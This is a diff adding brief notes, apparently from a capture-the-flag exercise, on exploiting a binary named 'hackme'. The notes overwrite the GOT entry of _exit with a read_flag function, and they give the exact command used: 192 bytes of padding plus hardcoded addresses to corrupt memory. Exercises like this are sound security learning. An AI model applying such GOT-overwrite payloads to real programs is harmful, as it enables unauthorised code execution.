@@ -1,0 +1,6 @@
+rewrote GOT entry of _exit with read_flag
+referred: http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html
+fixed environment using script https://github.com/hellman/fixenv
+
+command ran:
+./fixenv.sh ./hackme `python -c "print \"a\"*192 + \"\x2d\x85\x04\x08\x0c\xa0\x04\x08\" + \"a\"*0 + '\x8c'"`
